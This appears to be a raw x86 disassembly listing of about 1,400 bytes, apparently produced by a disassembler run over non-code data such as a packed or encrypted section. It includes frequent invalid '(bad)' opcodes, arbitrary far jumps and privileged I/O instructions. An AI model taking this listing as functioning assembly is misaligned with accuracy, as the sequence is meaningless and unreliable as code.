  40ee1e:	mov    al,0xbe
  40ee20:	mov    ah,0x6
  40ee22:	sub    eax,DWORD PTR [edx+0x1a63235e]
  40ee28:	jno    0x40ee9e
  40ee2a:	ja     0x40ede7
  40ee2c:	jns    0x40ee7d
  40ee2e:	xchg   ecx,eax
  40ee2f:	and    eax,0xaa5cdf3
  40ee34:	push   edi
  40ee35:	scas   eax,DWORD PTR es:[edi]
  40ee36:	outs   dx,DWORD PTR ds:[esi]
  40ee37:	pusha  
  40ee38:	lahf   
  40ee39:	in     al,0x7f
  40ee3b:	xor    eax,0x63c294c8
  40ee40:	cmp    BYTE PTR [ebx],bh
  40ee42:	mov    ecx,0xc2ba2023
  40ee47:	xor    al,0xd4
  40ee49:	jmp    0x40eea2
  40ee4b:	fsub   st(7),st
  40ee4d:	and    eax,0x29f401b9
  40ee52:	out    dx,eax
  40ee53:	ss pop ds
  40ee55:	outs   dx,DWORD PTR ds:[esi]
  40ee56:	adc    dh,dh
  40ee58:	lds    ebp,FWORD PTR [ecx]
  40ee5a:	js     0x40ee92
  40ee5c:	dec    esp
  40ee5d:	mov    ebx,0x946ddd77
  40ee62:	push   ebp
  40ee63:	sub    al,0x71
  40ee65:	adc    BYTE PTR [eax-0x3f],bh
  40ee68:	jg     0x40ee80
  40ee6a:	xor    bl,ch
  40ee6c:	mov    al,0xb1
  40ee6e:	lahf   
  40ee6f:	stos   DWORD PTR es:[edi],eax
  40ee70:	leave  
  40ee71:	add    eax,0x677a5441
  40ee76:	fldenv cs:[eax]
  40ee79:	clc    
  40ee7a:	ins    DWORD PTR es:[edi],dx
  40ee7b:	call   0x3edc:0x30a12b61
  40ee82:	pop    edi
  40ee83:	cld    
  40ee84:	int3   
  40ee85:	jl     0x40eee5
  40ee87:	dec    ecx
  40ee88:	outs   dx,DWORD PTR ds:[esi]
  40ee89:	add    eax,0x9c978e5a
  40ee8e:	sbb    eax,0xb6f3e1f0
  40ee93:	jo     0x40ee16
  40ee95:	push   es
  40ee96:	mov    BYTE PTR [ecx+0x36],ch
  40ee99:	hlt    
  40ee9a:	mov    al,0xda
  40ee9c:	mov    dl,0xe1
  40ee9e:	std    
  40ee9f:	fldcw  WORD PTR [ebp+edx*2+0x69]
  40eea3:	rcr    BYTE PTR [edx+0x77],0xf3
  40eea7:	icebp  
  40eea8:	xlat   BYTE PTR ds:[ebx]
  40eea9:	in     al,dx
  40eeaa:	mov    ds:0xe3d29417,al
  40eeaf:	push   esi
  40eeb0:	mov    WORD PTR [ecx-0x45],gs
  40eeb3:	loop   0x40ee54
  40eeb5:	call   0xf291:0xd3e54715
  40eebc:	repz cmp eax,0x38ed2afe
  40eec2:	(bad)  
  40eec3:	dec    esi
  40eec4:	cdq    
  40eec5:	fs push eax
  40eec7:	inc    ecx
  40eec8:	push   edx
  40eec9:	rcr    esi,0x6e
  40eecc:	pop    ss
  40eecd:	fnstenv [esp+ecx*2-0x6824c47d]
  40eed4:	and    al,0x6c
  40eed6:	cdq    
  40eed7:	mov    esi,edi
  40eed9:	dec    ebx
  40eeda:	inc    edi
  40eedb:	pop    edi
  40eedc:	add    DWORD PTR [ecx],ebx
  40eede:	outs   dx,BYTE PTR ds:[esi]
  40eedf:	adc    ebp,0xc
  40eee2:	pop    edx
  40eee3:	aad    0xbc
  40eee5:	fst    QWORD PTR [ecx+ebp*8-0x57]
  40eee9:	in     eax,dx
  40eeea:	js     0x40eec9
  40eeec:	loopne 0x40ef0a
  40eeee:	adc    BYTE PTR [edx-0x76be9774],bl
  40eef4:	sub    al,0x49
  40eef6:	adc    DWORD PTR [eax],edx
  40eef8:	jbe    0x40ef05
  40eefa:	clc    
  40eefb:	mov    ds:0xfd90a450,al
  40ef00:	(bad)  
  40ef02:	mov    bl,0x55
  40ef04:	mov    ds:0xe4230eaa,al
  40ef09:	push   edi
  40ef0a:	scas   eax,DWORD PTR es:[edi]
  40ef0b:	push   ss
  40ef0c:	or     BYTE PTR [esi+0x30b56316],0x45
  40ef13:	and    ebp,DWORD PTR [eax]
  40ef15:	fwait
  40ef16:	call   0x2a5f3c35
  40ef1b:	mov    edx,0x135bf4dd
  40ef20:	cmovb  esi,edi
  40ef23:	mov    esp,0x6f7a4db0
  40ef28:	push   ecx
  40ef29:	mov    bl,0xd1
  40ef2b:	push   edx
  40ef2c:	jg     0x40eeba
  40ef2e:	and    esi,DWORD PTR [ebp+0x77]
  40ef31:	or     eax,0x3b0c83ee
  40ef36:	adc    dl,BYTE PTR [edi]
  40ef38:	lods   eax,DWORD PTR ds:[esi]
  40ef39:	dec    eax
  40ef3a:	cld    
  40ef3b:	in     eax,0x73
  40ef3d:	loop   0x40ef3e
  40ef3f:	rol    BYTE PTR [edx+0x2fb1ee3a],cl
  40ef45:	cwde   
  40ef46:	dec    esi
  40ef47:	add    DWORD PTR [esi+0x74],0x58
  40ef4b:	and    dh,BYTE PTR [edi]
  40ef4d:	mov    DWORD PTR [edi],eax
  40ef4f:	pop    ebx
  40ef50:	xchg   ecx,eax
  40ef51:	aas    
  40ef52:	xchg   BYTE PTR [eax],ch
  40ef54:	retf   0x285
  40ef57:	xor    eax,0x2d6336ad
  40ef5c:	aad    0x62
  40ef5e:	and    ecx,DWORD PTR [edi+0x5f]
  40ef61:	push   edi
  40ef62:	add    BYTE PTR [edi+0x23],cl
  40ef65:	cmp    ebp,DWORD PTR [edx]
  40ef67:	scas   eax,DWORD PTR es:[edi]
  40ef68:	push   edi
  40ef69:	cmp    eax,0xcbd10144
  40ef6e:	cwde   
  40ef6f:	cmp    dh,BYTE PTR [esi+ebp*8]
  40ef72:	ret    
  40ef73:	sbb    ah,BYTE PTR [ebp+0x73]
  40ef76:	mov    bl,0xa2
  40ef78:	sub    DWORD PTR [ebp-0x4],edi
  40ef7b:	aad    0x7d
  40ef7d:	mov    ds:0x1ef13215,al
  40ef82:	ds adc eax,0xd899ce9e
  40ef88:	fadd   st,st(1)
  40ef8a:	sbb    bh,BYTE PTR [esi-0xc]
  40ef8d:	add    dh,BYTE PTR [edi-0x64034eb0]
  40ef93:	call   0x1d353e85
  40ef98:	inc    eax
  40ef99:	shl    ah,1
  40ef9b:	pop    ebx
  40ef9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef9d:	jle    0x40ef54
  40ef9f:	xchg   ebp,eax
  40efa0:	jae    0x40efdf
  40efa2:	sbb    BYTE PTR [bx],0xdd
  40efa6:	push   eax
  40efa7:	sbb    BYTE PTR [ebp-0x19],0x82
  40efab:	in     al,0xae
  40efad:	cmp    eax,0x57746752
  40efb2:	pop    eax
  40efb3:	mov    ch,0xd2
  40efb5:	(bad)  [ebx+0x33]
  40efb8:	(bad)  
  40efb9:	lods   al,BYTE PTR ds:[esi]
  40efba:	call   0x133a:0x16031988
  40efc1:	adc    al,0x31
  40efc3:	push   esi
  40efc4:	jb     0x40efcc
  40efc6:	nop
  40efc7:	pop    es
  40efc8:	push   esp
  40efc9:	ja     0x40efe7
  40efcb:	add    al,0x8e
  40efcd:	je     0x40efc9
  40efcf:	and    al,0xc
  40efd1:	xchg   ecx,eax
  40efd2:	xchg   esi,eax
  40efd3:	mov    esp,0xbd874c51
  40efd8:	repnz enter 0x962e,0x5e
  40efdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efde:	lds    esi,FWORD PTR [esi+0x61]
  40efe1:	mov    ds:0xfa0955f1,al
  40efe6:	push   es
  40efe7:	pop    esp
  40efe8:	data16 jb 0x40efe4
  40efeb:	aas    
  40efec:	int    0xe6
  40efee:	push   0x1
  40eff0:	mov    ch,0xbc
  40eff2:	mov    dl,ch
  40eff4:	dec    edx
  40eff5:	jle    0x40efd8
  40eff7:	fstp   DWORD PTR [eax+0x42ec9021]
  40effd:	pop    es
  40effe:	ficom  WORD PTR [esp+edx*4+0x38577222]
  40f005:	int3   
  40f006:	and    BYTE PTR [esi],al
  40f008:	out    0x3e,al
  40f00a:	pop    ss
  40f00b:	js     0x40eff7
  40f00d:	mov    edx,0x3ee21c58
  40f012:	mov    edi,0xe4577e35
  40f017:	aaa    
  40f018:	ins    BYTE PTR es:[edi],dx
  40f019:	dec    edi
  40f01a:	mov    ch,0xb6
  40f01c:	mov    eax,ds:0x84df83be
  40f021:	or     ebx,DWORD PTR [ecx+ebp*4-0x35c17cfd]
  40f028:	cmc    
  40f029:	inc    esp
  40f02a:	fnstsw WORD PTR [ecx]
  40f02c:	xchg   ebx,eax
  40f02d:	xor    ch,BYTE PTR [eax+0x53f16e3a]
  40f033:	shl    BYTE PTR [ebp-0x61545d4e],cl
  40f039:	push   edi
  40f03a:	mov    edx,0xe4d545bf
  40f03f:	ret    
  40f040:	shr    bl,cl
  40f042:	jg     0x40eff4
  40f044:	rcl    DWORD PTR [edx],0x52
  40f047:	xlat   BYTE PTR ds:[ebx]
  40f048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f049:	mov    esp,0x37476ed2
  40f04e:	loope  0x40f07c
  40f050:	inc    esi
  40f051:	fcmove st,st(0)
  40f053:	nop
  40f054:	mov    BYTE PTR [eax-0x330599f9],cl
  40f05a:	xlat   BYTE PTR ds:[ebx]
  40f05b:	jns    0x40f033
  40f05d:	jb     0x40f033
  40f05f:	mov    ds:0x4bc4093e,al
  40f064:	and    BYTE PTR ds:0x48ce4d79,al
  40f06a:	sbb    DWORD PTR [ebp+eax*8-0x7d075b90],edx
  40f071:	and    DWORD PTR [edx+0x74],ebp
  40f074:	cmp    ebx,DWORD PTR [eax]
  40f076:	push   ebp
  40f077:	push   0xfffffff1
  40f079:	loopne 0x40f086
  40f07b:	stos   DWORD PTR es:[edi],eax
  40f07c:	jle    0x40f07f
  40f07e:	mov    BYTE PTR [ecx+0x45],ch
  40f081:	aaa    
  40f082:	and    dl,BYTE PTR [edx+ecx*4]
  40f085:	pushf  
  40f086:	inc    ebp
  40f087:	jmp    0x40f0ee
  40f089:	(bad)  [edx+0x58]
  40f08c:	mov    eax,ds:0x460cb47b
  40f091:	in     al,0x3f
  40f093:	vmread ecx,edx
  40f096:	(bad)  
  40f097:	xchg   edx,eax
  40f098:	ss shl dl,0xfa
  40f09c:	fwait
  40f09d:	or     esp,DWORD PTR [eax-0x77]
  40f0a0:	add    al,BYTE PTR [esi]
  40f0a2:	sub    al,cl
  40f0a4:	inc    ebx
  40f0a5:	imul   ecx,DWORD PTR [ebp+0x8],0xffffff9c
  40f0a9:	rcr    al,1
  40f0ab:	jmp    0x53755ae
  40f0b0:	frstor [edx+eax*4-0x35]
  40f0b4:	cmp    dl,BYTE PTR [esi]
  40f0b6:	sub    bl,BYTE PTR [eax+0x30a4ae1d]
  40f0bc:	lods   eax,DWORD PTR ds:[esi]
  40f0bd:	scas   al,BYTE PTR es:[edi]
  40f0be:	(bad)  
  40f0bf:	jecxz  0x40f0f5
  40f0c1:	lea    esp,[edi]
  40f0c3:	xor    eax,0x5374d02d
  40f0c8:	pop    es
  40f0c9:	cli    
  40f0ca:	add    eax,ecx
  40f0cc:	xor    ah,BYTE PTR [ebp-0x10c998cf]
  40f0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d3:	jne    0x40f0a4
  40f0d5:	adc    eax,0x96456694
  40f0da:	add    al,0x2
  40f0dc:	inc    ebx
  40f0dd:	pop    ebp
  40f0de:	pushf  
  40f0df:	out    0x86,eax
  40f0e1:	xchg   bh,dl
  40f0e3:	hlt    
  40f0e4:	xchg   ebp,eax
  40f0e5:	jmp    0x40f12b
  40f0e7:	jno    0x40f0e7
  40f0e9:	cmp    al,0xb2
  40f0eb:	fsubr  QWORD PTR [ecx+0x4a]
  40f0ee:	ret    0x7228
  40f0f1:	push   0xffffff9d
  40f0f3:	and    BYTE PTR [esi+0x2e8649cf],ch
  40f0f9:	xchg   ebx,eax
  40f0fa:	imul   esi,DWORD PTR [esi+ebp*2+0x2ff6bcee],0x45b1beeb
  40f105:	shl    DWORD PTR [esi],cl
  40f107:	jmp    0x664b:0x2dfc464a
  40f10e:	push   ds
  40f10f:	mov    ss,WORD PTR [ecx+0x50d493c3]
  40f115:	jnp    0x40f12f
  40f117:	out    0xdd,eax
  40f119:	(bad)  [ecx-0x10849a32]
  40f11f:	push   esi
  40f120:	sti    
  40f121:	push   0x50
  40f123:	(bad)  
  40f124:	sahf   
  40f125:	and    eax,DWORD PTR [eax+esi*2]
  40f128:	fdiv   st(6),st
  40f12a:	fldenv [edi+ecx*4+0x7a]
  40f12e:	xor    al,0x18
  40f130:	dec    edx
  40f131:	mov    dl,0x8f
  40f133:	leave  
  40f134:	mov    eax,0xb613ebae
  40f139:	xor    DWORD PTR [ecx+0x379ea503],0xbee978e1
  40f143:	das    
  40f144:	jmp    0x657f:0xbbec52d9
  40f14b:	imul   ecx,DWORD PTR [edx-0x53],0x75e0297a
  40f152:	jbe    0x40f119
  40f154:	inc    eax
  40f155:	leave  
  40f156:	add    al,0xeb
  40f158:	mov    ah,0xf8
  40f15a:	add    ah,BYTE PTR [ebx-0x6a8d96d7]
  40f160:	and    cl,BYTE PTR [eax+edx*2]
  40f163:	push   eax
  40f164:	add    eax,0xdccb2b3d
  40f169:	aad    0x9f
  40f16b:	sub    BYTE PTR [ebp-0x42],ah
  40f16e:	leave  
  40f16f:	(bad)  
  40f171:	daa    
  40f172:	fst    QWORD PTR [ecx+0x1de2e43b]
  40f178:	push   edi
  40f179:	mov    esi,esi
  40f17b:	mov    esp,gs
  40f17d:	jmp    0x40f12d
  40f17f:	jge    0x40f153
  40f181:	sub    BYTE PTR [eax+0x329fd57e],bh
  40f187:	xor    BYTE PTR [ebp-0x10],bh
  40f18a:	inc    edi
  40f18b:	and    eax,esi
  40f18d:	mov    ebp,ebp
  40f18f:	call   0xdc60:0x9b97490c
  40f196:	std    
  40f197:	add    bl,dl
  40f199:	push   esp
  40f19a:	inc    eax
  40f19b:	sbb    DWORD PTR [ecx-0x7],ebx
  40f19e:	and    BYTE PTR [ecx+0x48],al
  40f1a1:	sti    
  40f1a2:	rcr    DWORD PTR [ebx-0x5ba5a228],cl
  40f1a8:	inc    ebx
  40f1a9:	mov    al,ds:0xdda551c2
  40f1ae:	clc    
  40f1af:	push   eax
  40f1b0:	inc    eax
  40f1b1:	jbe    0x40f1fa
  40f1b3:	dec    ebp
  40f1b4:	stc    
  40f1b5:	mov    bl,0xad
  40f1b7:	popf   
  40f1b8:	nop
  40f1b9:	fldcw  WORD PTR ds:0xa5d3
  40f1be:	and    al,0xaf
  40f1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c1:	idiv   BYTE PTR [edi]
  40f1c3:	mov    ecx,0xfda61e4e
  40f1c8:	mov    eax,ds:0xa9e4c31d
  40f1cd:	xchg   edx,eax
  40f1ce:	(bad)  
  40f1cf:	out    dx,al
  40f1d0:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40f1d2:	inc    eax
  40f1d3:	scas   eax,DWORD PTR es:[edi]
  40f1d4:	jns    0x40f1e0
  40f1d6:	test   BYTE PTR [eax+0x638af3a4],ah
  40f1dc:	pop    ds
  40f1dd:	cli    
  40f1de:	inc    eax
  40f1df:	pop    es
  40f1e0:	leave  
  40f1e1:	sub    al,0xe2
  40f1e3:	fst    DWORD PTR [edx-0x9e8372b]
  40f1e9:	ja     0x40f259
  40f1eb:	aaa    
  40f1ec:	scas   eax,DWORD PTR es:[edi]
  40f1ed:	mov    eax,0xf31ac580
  40f1f2:	cld    
  40f1f3:	test   al,0x29
  40f1f5:	pop    eax
  40f1f6:	mov    bl,0x48
  40f1f8:	or     BYTE PTR [ebp-0x3a870d0c],dl
  40f1fe:	or     eax,0xa88f168a
  40f203:	xor    eax,ecx
  40f205:	pop    dx
  40f207:	inc    ebx
  40f208:	(bad)  
  40f20a:	jno    0x40f268
  40f20c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f20d:	xor    eax,0xfbb93129
  40f212:	cmp    eax,0x940f2a39
  40f217:	clc    
  40f218:	mov    edi,0x5497da8a
  40f21d:	adc    DWORD PTR [esi-0x69],ebx
  40f220:	frstor [edx+0x4e17075]
  40f226:	loopne 0x40f22b
  40f228:	cs mov bh,0x46
  40f22b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f22c:	stos   BYTE PTR es:[edi],al
  40f22d:	add    BYTE PTR [edi-0x1b],0x2b
  40f231:	pop    esi
  40f232:	fdiv   DWORD PTR [ebp+ecx*1+0x0]
  40f236:	out    dx,al
  40f237:	jmp    0x6af:0xe214dd37
  40f23e:	les    ecx,FWORD PTR [eax-0x76]
  40f241:	xor    DWORD PTR [esi-0x620d02d7],eax
  40f247:	sub    al,0x36
  40f249:	retf   0x99bb
  40f24c:	jns    0x40f1ea
  40f24e:	out    0x5d,al
  40f250:	sbb    eax,0xd3bb6b0a
  40f255:	xor    esp,DWORD PTR cs:[esi+0x4]
  40f259:	addr16 mov esi,0x2893b9de
  40f25f:	mov    edx,0xd5389a7e
  40f264:	arpl   cx,sp
  40f266:	pop    ebx
  40f267:	or     edx,DWORD PTR [esi+0x4b]
  40f26a:	inc    eax
  40f26b:	(bad)  
  40f26c:	xchg   esi,eax
  40f26d:	pop    ebx
  40f26e:	inc    esp
  40f26f:	retf   
  40f270:	out    dx,eax
  40f271:	or     ch,dh
  40f273:	sbb    ebp,DWORD PTR [esi]
  40f275:	or     BYTE PTR [eax+0xc5f551c],dl
  40f27b:	mov    ah,0x27
  40f27d:	int3   
  40f27e:	out    0xf2,eax
  40f280:	test   eax,0xc0676431
  40f285:	push   edx
  40f286:	cwde   
  40f287:	call   0x3216:0x158f8806
  40f28e:	inc    esp
  40f28f:	fadd   DWORD PTR [edi-0x5970ff36]
  40f295:	sbb    BYTE PTR [ebp-0x4ef452ec],dl
  40f29b:	pop    ax
  40f29d:	push   es
  40f29e:	std    
  40f29f:	fcmovnu st,st(3)
  40f2a1:	pushf  
  40f2a2:	test   eax,0x73f0cbe4
  40f2a7:	fidiv  WORD PTR [edx-0x12]
  40f2aa:	in     al,dx
  40f2ab:	jmp    0xfff3ac92
  40f2b0:	dec    ebp
  40f2b1:	jecxz  0x40f272
  40f2b3:	les    edx,FWORD PTR [edx]
  40f2b5:	push   ss
  40f2b6:	repz or cl,BYTE PTR [esi-0x3e]
  40f2ba:	call   0x4699346d
  40f2bf:	mov    esi,0x6fec5bef
  40f2c4:	mov    bh,0x2f
  40f2c6:	add    al,0x8
  40f2c8:	sub    ecx,esi
  40f2ca:	cdq    
  40f2cb:	inc    edx
  40f2cc:	test   DWORD PTR [esi],0x171d5af9
  40f2d2:	inc    esi
  40f2d3:	adc    DWORD PTR [ebp+0x5b],0xc2e9d35d
  40f2da:	cld    
  40f2db:	add    DWORD PTR [ebx],0xffffff85
  40f2de:	inc    ebp
  40f2df:	out    0xae,al
  40f2e1:	mov    eax,0x90daddb8
  40f2e6:	adc    BYTE PTR [ecx-0x65c25800],0x5
  40f2ed:	fs leave 
  40f2ef:	jae    0x40f32a
  40f2f1:	mov    ebx,0x60b4c45a
  40f2f6:	add    eax,0x5c0575f
  40f2fb:	mov    esi,0xc9cc543
  40f300:	or     DWORD PTR [ebx-0x115d8bfb],eax
  40f306:	ss sub esi,ebp
  40f309:	data16 cld 
  40f30b:	mov    ebx,0x7550faa2
  40f310:	push   esi
  40f311:	stc    
  40f312:	cmp    esp,DWORD PTR [edx-0x4b]
  40f315:	or     eax,0xad11cad0
  40f31a:	sbb    al,0x23
  40f31c:	dec    eax
  40f31d:	inc    esp
  40f31e:	xor    bh,dl
  40f320:	mov    ebx,0xeea6ff2d
  40f325:	sbb    BYTE PTR [ecx],al
  40f327:	aad    0x68
  40f329:	jmp    0x849b58a4
  40f32e:	je     0x40f2b3
  40f330:	mov    ds:0x27cab9d9,eax
  40f335:	push   ebx
  40f336:	and    dh,dl
  40f338:	pushf  
  40f339:	inc    esp
  40f33a:	pushw  cs
  40f33c:	or     al,0x6f
  40f33e:	mov    ds:0xc6b33e09,al
  40f343:	cmp    BYTE PTR [esi+0x506b2e18],0xcc
  40f34a:	(bad)  
  40f34b:	idiv   DWORD PTR [eax+eax*2]
  40f34e:	test   al,0x9c
  40f350:	pop    esp
  40f351:	jnp    0x40f3cb
  40f353:	or     BYTE PTR [eax-0x6605a37d],dh
  40f359:	pop    ebp
  40f35a:	cmp    bh,BYTE PTR [edi]
  40f35c:	gs pop eax
  40f35e:	sub    BYTE PTR [ebp+0x2c],dh
  40f361:	mov    bh,0x4b
  40f363:	je     0x40f3d9
  40f365:	mov    WORD PTR [ebx-0x3f],?
  40f368:	inc    eax
  40f369:	jge    0x40f32f
  40f36b:	scas   eax,DWORD PTR es:[edi]
  40f36c:	cdq    
  40f36d:	in     al,0xaf
  40f36f:	ficom  DWORD PTR [edi-0x2bf6996b]
  40f375:	cwde   
  40f376:	fdivr  DWORD PTR [ebx+0x6118c01f]
  40f37c:	fnstsw ax
  40f37e:	mov    ch,0x9f
  40f380:	sub    BYTE PTR [esi-0x739689a7],0xed
  40f387:	enter  0xd475,0x4f
  40f38b:	sbb    edx,esp
  40f38d:	out    dx,eax
  40f38e:	cld    
  40f38f:	shr    BYTE PTR [ebx-0x5f],1
  40f392:	sbb    ecx,esp
  40f394:	test   eax,0xd021ebf8
  40f399:	push   ebx
  40f39a:	push   edx
  40f39b:	imul   eax,DWORD PTR [esi-0x5e],0xeba61348
  40f3a2:	inc    esi
  40f3a3:	cld    
  40f3a4:	xchg   BYTE PTR [ebp-0x40027695],bh
  40f3aa:	add    ah,BYTE PTR [esi+edx*1+0x61]
  40f3ae:	dec    edi
  40f3af:	(bad)  
  40f3b0:	call   0x254e112c
  40f3b5:	test   eax,0xa42eb4bd
  40f3ba:	add    BYTE PTR [ebx+edi*2+0x2163f524],0xb
  40f3c2:	icebp  
  40f3c3:	dec    esi
  40f3c4:	and    eax,0x11deffc
  40f3c9:	scas   al,BYTE PTR es:[edi]
  40f3ca:	jmp    0x40f3f5
  40f3cc:	mov    bl,0xfa
  40f3ce:	add    cl,bl
  40f3d0:	or     al,0xfa
  40f3d2:	daa    
  40f3d3:	out    dx,al
  40f3d4:	jnp    0x40f41f
  40f3d6:	inc    edx
  40f3d7:	test   al,0x92
  40f3d9:	lods   eax,DWORD PTR ds:[esi]
  40f3da:	leave  
  40f3db:	sbb    eax,ebp
  40f3dd:	stos   DWORD PTR es:[edi],eax
  40f3de:	int3   
  40f3df:	int3   
  40f3e0:	pop    es
  40f3e1:	imul   eax,esp,0x62
  40f3e4:	clc    
  40f3e5:	adc    dh,ch
  40f3e7:	ins    DWORD PTR es:[edi],dx
  40f3e8:	xor    al,bl
  40f3ea:	lea    eax,[ecx]
  40f3ec:	pop    edi
  40f3ed:	or     dh,BYTE PTR [ecx-0x29cd1a9b]
  40f3f3:	(bad)  
  40f3f4:	or     al,0xbc
  40f3f6:	cmc    
  40f3f7:	rcl    DWORD PTR [edi],cl
  40f3f9:	or     eax,0x66416d9b
  40f3fe:	push   esp
  40f3ff:	mov    ds:0x4e0de897,al
  40f404:	int    0x85
  40f406:	or     eax,esp
  40f408:	ja     0x40f486
  40f40a:	fcom   st(4)
  40f40c:	add    BYTE PTR [eax+0x3f3120bc],al
  40f412:	(bad)  
  40f413:	sub    eax,0x47f6f87c
  40f418:	es retf 0x1b19
  40f41c:	fisubr DWORD PTR [ebx-0x5]
  40f41f:	sahf   
  40f420:	jbe    0x40f3f8
  40f422:	xor    al,BYTE PTR ds:0x366091c6
  40f428:	es dec esp
  40f42a:	sti    
  40f42b:	test   eax,0xcb9c817a
  40f431:	arpl   WORD PTR [edi],cx
  40f433:	mov    dh,0xf9
  40f435:	cmp    dl,cl
  40f437:	into   
  40f438:	leave  
  40f439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f43a:	iret   
  40f43b:	popf   
  40f43c:	repnz cmp al,0x7b
  40f43f:	sub    eax,0x34d5b038
  40f444:	push   ebx
  40f445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f446:	cmp    edi,DWORD PTR [ebp+edi*4-0x13d8a6a]
  40f44d:	adc    al,0xf1
  40f44f:	mov    bx,0x943a
  40f453:	cmc    
  40f454:	or     bl,ah
  40f456:	lods   al,BYTE PTR ds:[esi]
  40f457:	and    ebx,eax
  40f459:	mov    al,0x2a
  40f45b:	or     dl,dl
  40f45d:	cwde   
  40f45e:	adc    BYTE PTR [ebp-0x6c],cl
  40f461:	pop    ss
  40f462:	push   ebx
  40f463:	mov    ebp,0x50156088
  40f468:	imul   ecx,DWORD PTR [ecx+0x56ea5d3d],0x2d
  40f46f:	xor    eax,0x3b6f0d39
  40f474:	imul   ecx,edx,0x787e13b9
  40f47a:	xchg   ebx,eax
  40f47b:	mov    ebp,0xf93c8317
  40f480:	imul   DWORD PTR [ebx-0x1e91953e]
  40f486:	jg     0x40f410
  40f488:	mov    ds:0xa8c3f36,al
  40f48d:	fisubr WORD PTR [ecx+ebp*1]
  40f490:	pop    esi
  40f491:	sbb    ebx,esi
  40f493:	rcl    DWORD PTR [eax],cl
  40f495:	scas   al,BYTE PTR es:[edi]
  40f496:	inc    edx
  40f497:	js     0x40f48b
  40f499:	js     0x40f4e2
  40f49b:	dec    esi
  40f49c:	mov    ss,edi
  40f49e:	es loop 0x40f510
  40f4a1:	sbb    dl,BYTE PTR [esi-0x49f03fb4]
  40f4a7:	retf   
  40f4a8:	and    ch,BYTE PTR [ebx-0x6d]
  40f4ab:	xor    esi,ebp
  40f4ad:	sbb    al,BYTE PTR [eax]
  40f4af:	pop    edx
  40f4b0:	xor    edi,ebp
  40f4b2:	pop    ss
  40f4b3:	(bad)  
  40f4b4:	lahf   
  40f4b5:	pop    es
  40f4b6:	and    dh,BYTE PTR [edx+0x2f]
  40f4b9:	leave  
  40f4ba:	mov    ebp,0x749cf440
  40f4bf:	and    ecx,DWORD PTR [edi-0x17052f2f]
  40f4c5:	mov    ch,0x63
  40f4c7:	adc    al,0x71
  40f4c9:	xchg   ebp,eax
  40f4ca:	sti    
  40f4cb:	inc    ebp
  40f4cc:	hlt    
  40f4cd:	int    0x9f
  40f4cf:	out    0x27,eax
  40f4d1:	rcl    BYTE PTR [ebx],0xfd
  40f4d4:	mov    ?,WORD PTR [edi+eiz*8+0x70]
  40f4d8:	xor    eax,0x6f4fc7b4
  40f4dd:	das    
  40f4de:	or     esp,DWORD PTR [ecx+0x76]
  40f4e1:	mov    eax,ds:0xd1cbf287
  40f4e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4e7:	ins    BYTE PTR es:[edi],dx
  40f4e8:	loop   0x40f54e
  40f4ea:	fwait
  40f4eb:	mov    dl,BYTE PTR [edi+edx*2+0x31]
  40f4ef:	pop    ecx
  40f4f0:	out    dx,eax
  40f4f1:	push   edx
  40f4f2:	push   0x4b5adb6b
  40f4f7:	loop   0x40f52d
  40f4f9:	jmp    0xdac6:0xbaf392f2
  40f500:	add    BYTE PTR [esi],0xd4
  40f503:	mov    al,0xb3
  40f505:	push   0xcfe3a38b
  40f50a:	stos   DWORD PTR es:[edi],eax
  40f50b:	adc    edx,DWORD PTR [ecx+0x2b]
  40f50e:	adc    BYTE PTR [ecx+ecx*1-0x6b],al
  40f512:	repz into 
  40f514:	xor    dl,dh
  40f516:	out    dx,eax
  40f517:	xor    ecx,eax
  40f519:	xchg   edx,eax
  40f51a:	daa    
  40f51b:	shl    BYTE PTR [eax],1
  40f51d:	jae    0x40f545
  40f51f:	or     eax,0xd9a69c2c
  40f524:	cmp    eax,0xeaab9207
  40f529:	ret    
  40f52a:	dec    ecx
  40f52b:	imul   ecx,DWORD PTR [eax-0x15f28180],0xffffffa1
  40f532:	pop    ebx
  40f533:	mov    ah,0x8
  40f535:	(bad)  
  40f536:	out    0x6b,eax
  40f538:	inc    BYTE PTR [ebp-0x1a]
  40f53b:	push   cs
  40f53c:	(bad)  
  40f53d:	shl    DWORD PTR es:[eax],1
  40f540:	pusha  
  40f541:	sub    dl,dh
  40f543:	loope  0x40f4c5
  40f545:	add    al,0x22
  40f547:	jo     0x40f4f1
  40f549:	dec    edi
  40f54a:	(bad)  
  40f54b:	push   ss
  40f54c:	lahf   
  40f54d:	inc    esi
  40f54e:	jb     0x40f4f7
  40f550:	fsubp  st(5),st
  40f552:	ja     0x40f564
  40f554:	dec    edx
  40f555:	les    esi,FWORD PTR [ecx+0x3f31d81]
  40f55b:	jbe    0x40f58b
  40f55d:	daa    
  40f55e:	fst    QWORD PTR [eax+0x56]
  40f561:	cwde   
  40f562:	cs jmp 0x28e7ba81
  40f568:	repnz sbb al,0x16
  40f56b:	mov    eax,0xdec7f11a
  40f570:	and    edi,DWORD PTR [edx-0x5a]
  40f573:	inc    ebx
  40f574:	cmp    al,0x41
  40f576:	inc    ecx
  40f577:	sbb    ebx,DWORD PTR [edx]
  40f579:	es pop ss
  40f57b:	sbb    BYTE PTR [ebx-0x7a859ddf],bh
  40f581:	mov    al,ds:0x8dc8985d
  40f586:	ins    DWORD PTR es:[edi],dx
  40f587:	lock sar DWORD PTR ds:0x8133d458,cl
  40f58e:	dec    ecx
  40f58f:	out    dx,al
  40f590:	xchg   edx,eax
  40f591:	mov    fs,WORD PTR ds:0x6d80e693
  40f597:	jmp    0x40f553
  40f599:	fisttp QWORD PTR [ecx+0x1c47ae2d]
  40f59f:	imul   edx,esi,0xd3ff4f5d
  40f5a5:	adc    eax,0x8cf0947e
  40f5aa:	jl     0x40f53e
  40f5ac:	jg     0x40f561
  40f5ae:	mov    dh,0x8e
  40f5b0:	int    0x0
  40f5b2:	pop    ecx
  40f5b3:	scas   eax,DWORD PTR es:[edi]
  40f5b4:	inc    edx
